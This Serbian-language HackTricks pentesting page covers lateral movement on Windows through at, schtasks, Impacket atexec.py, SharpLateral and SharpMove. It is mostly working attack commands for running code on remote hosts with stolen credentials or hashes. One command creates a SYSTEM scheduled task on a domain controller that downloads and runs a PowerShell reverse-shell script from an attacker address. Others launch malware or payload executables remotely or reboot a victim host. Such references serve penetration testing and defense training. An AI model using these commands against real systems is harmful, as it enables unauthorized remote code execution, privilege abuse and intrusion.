# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Kako to funkcioniše

At omogućava zakazivanje zadataka na hostovima gde znate korisničko ime/(lozinku/Hash). Tako da ga možete koristiti za izvršavanje komandi na drugim hostovima i dobijanje izlaza.
```
At \\victim 11:00:00PM shutdown -r
```
Koristeći schtasks, prvo treba da kreirate zadatak, a zatim da ga pozovete:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Možete koristiti **Impacketov `atexec.py`** za izvršavanje komandi na udaljenim sistemima koristeći AT komandu. Ovo zahteva važeće akreditive (korisničko ime i lozinku ili hash) za ciljni sistem.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Možete takođe koristiti [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Možete koristiti [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Više informacija o [**upotrebi schtasks sa srebrnim karticama ovde**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
